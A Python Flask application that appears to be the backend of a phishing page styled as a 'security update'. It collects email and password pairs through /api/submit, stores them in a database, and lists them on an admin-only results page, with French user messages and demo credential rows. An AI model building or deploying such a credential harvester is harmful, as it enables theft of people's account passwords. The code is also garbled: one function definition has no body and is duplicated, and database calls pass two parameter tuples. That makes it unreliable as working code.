import base64
import os
import sqlite3
from datetime import datetime, timezone

from flask import Flask, jsonify, redirect, render_template, request, session, url_for

app = Flask(__name__)
app.secret_key = os.environ.get("FLASK_SECRET_KEY", "demo-secret-key")

DB_DIALECT = os.environ.get("DB_DIALECT", "postgres").lower()
SQLITE_PATH = os.environ.get("DB_SQLITE_PATH", "/tmp/securityupdate.db")
ADMIN_USER = os.environ.get("ADMIN_USER", "alix")
ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD", "***REDACTED***")

DEMO_ROWS = [
    ("client_demo@company.test", "SuperDemo!!", "2024-01-10T10:00:00Z"),
    ("test.account@corp.example", "DemoPassword!", "2024-01-09T08:30:00Z"),
]


def init_sqlite_db(conn: sqlite3.Connection) -> None:
    conn.execute(
        """
        CREATE TABLE IF NOT EXISTS submissions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            email_value TEXT NOT NULL,
            password_value TEXT NOT NULL,
            created_at TEXT NOT NULL
        )
        """
    )
    conn.commit()
    existing = conn.execute("SELECT COUNT(*) FROM submissions").fetchone()[0]
    if existing == 0:
        conn.executemany(
            """
            INSERT INTO submissions (email_value, password_value, created_at)
            VALUES (?, ?, ?)
            """,
            DEMO_ROWS,
        )
        conn.commit()


def get_db_connection():
    if DB_DIALECT == "sqlite":
        conn = sqlite3.connect(SQLITE_PATH)
        init_sqlite_db(conn)
        return conn
    import psycopg2
    return psycopg2.connect(
        host=os.environ.get("DB_HOST", "db"),
        port=os.environ.get("DB_PORT", "5432"),
        dbname=os.environ.get("DB_NAME", "securityupdate"),
        user=os.environ.get("DB_USER", "securityupdate"),
        password=os.environ.get("DB_PASSWORD", "securityupdate"),
    )


def store_submission(email_value: str, password_value: str) -> None:
def encode_base64(value: str) -> str:
    return base64.b64encode(value.encode("utf-8")).decode("utf-8")


def store_submission(email_value: str, password_value: str) -> None:
    encoded_email = encode_base64(email_value)
    encoded_password = encode_base64(password_value)
    created_at = datetime.now(timezone.utc).replace(microsecond=0).isoformat()

    with get_db_connection() as conn:
        if DB_DIALECT == "sqlite":
            conn.execute(
                """
                INSERT INTO submissions (email_value, password_value, created_at)
                VALUES (?, ?, ?)
                """,
                (email_value, password_value, created_at),
                (encoded_email, encoded_password, created_at),
            )
        else:
            with conn.cursor() as cur:
                cur.execute(
                    """
                    INSERT INTO submissions (email_value, password_value, created_at)
                    VALUES (%s, %s, %s)
                    """,
                    (email_value, password_value, created_at),
                    (encoded_email, encoded_password, created_at),
                )
        conn.commit()


def ensure_demo_rows(conn) -> None:
    with conn.cursor() as cur:
        cur.execute("SELECT COUNT(*) FROM submissions")
        existing = cur.fetchone()[0]
        if existing == 0:
            cur.executemany(
                """
                INSERT INTO submissions (email_value, password_value, created_at)
                VALUES (%s, %s, %s)
                """,
                DEMO_ROWS,
            )
    conn.commit()


def is_admin_authenticated() -> bool:
    return session.get("admin_authenticated", False)


@app.route("/")
def index():
    return render_template("index.html", cache_bust="v5")


@app.route("/admin", methods=["GET", "POST"])
def admin_login():
    if request.method == "POST":
        username = (request.form.get("username") or "").strip()
        password = request.form.get("password") or ""
        if username == ADMIN_USER and password == ADMIN_PASSWORD:
            session["admin_authenticated"] = True
            return redirect(url_for("results"))
        return render_template(
            "admin_login.html",
            error="Identifiants invalides. Réessayez.",
            cache_bust="v5",
        )
    return render_template("admin_login.html", cache_bust="v5")


@app.get("/logout")
def logout():
    session.pop("admin_authenticated", None)
    return redirect(url_for("admin_login"))


@app.post("/api/submit")
def submit():
    payload = request.get_json(silent=True) or {}
    email_value = (payload.get("email") or "").strip()
    password_value = (payload.get("password") or "").strip()

    if not email_value or not password_value:
        return jsonify({"ok": False, "message": "Email et mot de passe requis."}), 400

    store_submission(email_value, password_value)

    return jsonify({"ok": True})


@app.get("/results")
def results():
    if not is_admin_authenticated():
        return redirect(url_for("admin_login"))
    with get_db_connection() as conn:
        if DB_DIALECT == "sqlite":
            rows = conn.execute(
                """
                SELECT email_value, password_value, created_at
                FROM submissions
                ORDER BY created_at DESC
                """
            ).fetchall()
        else:
            ensure_demo_rows(conn)
            with conn.cursor() as cur:
                cur.execute(
                    """
                    SELECT email_value, password_value, created_at
                    FROM submissions
                    ORDER BY created_at DESC
                    """
                )
                rows = cur.fetchall()

    return render_template("results.html", rows=rows, cache_bust="v5")


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
